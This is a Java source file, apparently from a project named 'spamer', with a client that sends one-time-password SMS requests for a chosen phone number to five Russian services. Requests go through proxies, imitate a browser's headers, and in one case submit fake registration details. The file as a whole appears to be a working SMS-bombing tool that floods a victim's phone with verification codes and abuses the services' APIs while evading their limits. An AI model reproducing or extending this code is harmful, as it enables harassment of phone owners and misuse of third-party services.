package com.spamer.outer.integration;

import com.spamer.domain.ProxyEntity;
import com.spamer.domain.ServiceIntegrationKind;
import com.spamer.outer.OuterApiResult;
import java.util.HashMap;
import java.util.Map;
import org.springframework.stereotype.Component;

@Component
public class NodeVerifiedOtpClient {

    private static final String KORONAPAY_URL =
            "https://koronapay.com/transfers/online/api/users/otps";
    private static final String START_RU_URL = "https://start.ru/api/v1/auth/otp";
    private static final String QLEAN_URL =
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code";
    private static final String MTS_TV_URL =
            "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code";
    private static final String WEBBANKIR_URL = "https://ng-api.webbankir.com/user/v2/create";

    public OuterApiResult send(ServiceIntegrationKind kind, String phone, ProxyEntity proxy) {
        long started = System.currentTimeMillis();
        try {
            return switch (kind) {
                case KORONAPAY_OTP -> koronapay(phone, proxy);
                case START_RU_OTP -> startRu(phone, proxy);
                case QLEAN_OTP -> qlean(phone, proxy);
                case MTS_TV_OTP -> mtsTv(phone, proxy);
                case WEBBANKIR_OTP -> webbankir(phone, proxy);
                default -> throw new IllegalArgumentException("Unsupported integration: " + kind);
            };
        } catch (Exception ex) {
            return new OuterApiResult(0, System.currentTimeMillis() - started, ex.getMessage());
        }
    }

    private OuterApiResult koronapay(String phone, ProxyEntity proxy) throws Exception {
        CookieHttpSession session = new CookieHttpSession(proxy);
        Map<String, String> headers = jsonHeaders(null, null);
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        CookieHttpSession.HttpExchange response = session.postForm(
                KORONAPAY_URL,
                "phone=" + PhoneNormalizer.toNational(phone),
                headers);
        return IntegrationResponses.fromOtpExchange(response);
    }

    private OuterApiResult startRu(String phone, ProxyEntity proxy) throws Exception {
        CookieHttpSession session = new CookieHttpSession(proxy);
        String body = IntegrationResponses.toJson(Map.of("phone", PhoneNormalizer.toE164(phone)));
        CookieHttpSession.HttpExchange response = session.postJson(
                START_RU_URL, body, jsonHeaders("https://start.ru", "https://start.ru/"));
        return IntegrationResponses.fromOtpExchange(response);
    }

    private OuterApiResult qlean(String phone, ProxyEntity proxy) throws Exception {
        CookieHttpSession session = new CookieHttpSession(proxy);
        String body = IntegrationResponses.toJson(Map.of("phone", PhoneNormalizer.toNational(phone)));
        CookieHttpSession.HttpExchange response = session.postJson(
                QLEAN_URL, body, jsonHeaders("https://qlean.ru", "https://qlean.ru/"));
        return IntegrationResponses.fromOtpExchange(response);
    }

    private OuterApiResult mtsTv(String phone, ProxyEntity proxy) throws Exception {
        CookieHttpSession session = new CookieHttpSession(proxy);
        String url = MTS_TV_URL + "?msisdn=" + PhoneNormalizer.toNational(phone);
        CookieHttpSession.HttpExchange response = session.postEmpty(url, jsonHeaders(null, null));
        return IntegrationResponses.fromOtpExchange(response);
    }

    private OuterApiResult webbankir(String phone, ProxyEntity proxy) throws Exception {
        CookieHttpSession session = new CookieHttpSession(proxy);
        Map<String, Object> body = Map.of(
                "lastName", "Иванов",
                "firstName", "Иван",
                "middleName", "Иванович",
                "mobilePhone", PhoneNormalizer.toMobile7(phone),
                "email", "test@example.com",
                "smsCode", "");
        CookieHttpSession.HttpExchange response = session.postJson(
                WEBBANKIR_URL,
                IntegrationResponses.toJson(body),
                jsonHeaders("https://webbankir.com", "https://webbankir.com/"));
        return IntegrationResponses.fromOtpExchange(response);
    }

    private Map<String, String> jsonHeaders(String origin, String referer) {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", BrowserHeaders.USER_AGENT);
        headers.put("Accept", "application/json, text/plain, */*");
        headers.put("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7");
        headers.put("Content-Type", "application/json");
        if (origin != null) {
            headers.put("Origin", origin);
        }
        if (referer != null) {
            headers.put("Referer", referer);
        }
        return headers;
    }
}
